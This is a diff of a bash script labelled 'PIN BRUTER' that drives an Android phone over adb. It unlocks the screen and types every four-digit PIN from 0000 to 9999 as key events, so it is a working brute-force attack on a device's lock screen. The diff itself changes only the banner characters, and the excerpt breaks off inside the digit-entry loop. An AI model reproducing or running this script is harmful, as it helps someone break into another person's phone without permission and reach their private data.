@@ -1,26 +1,26 @@
 #!/usr/bin/env bash
-
-echo *******************
+echo
+echo :::::::::::::::::::
 echo PIN BRUTER STARTED
-echo *******************
+echo :::::::::::::::::::
 
-echo *******************
+echo :::::::::::::::::::::::::::
 echo INSTA ID : @mr_kali_hacker
-echo *******************
+echo ::::::::::::::::::::;;;;:;;
 
 
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
 
-echo ********************
+echo ::::::::::::::::::::
 echo BRUTE FORCE STARTED
-echo ********************
+echo ::::::::::::::::::::
 
 for i in {0000..9999}; do
 
-    echo **********************
+    echo ::::::::::::::::::::::
     echo BRUTEFORCING WITH  $i
-    echo **********************
+    echo ::::::::::::::::::::::
 	
     for (( j=0; j<${#i}; j++ )); do
         adb shell input keyevent $((`echo ${i:$j:1}`+7))
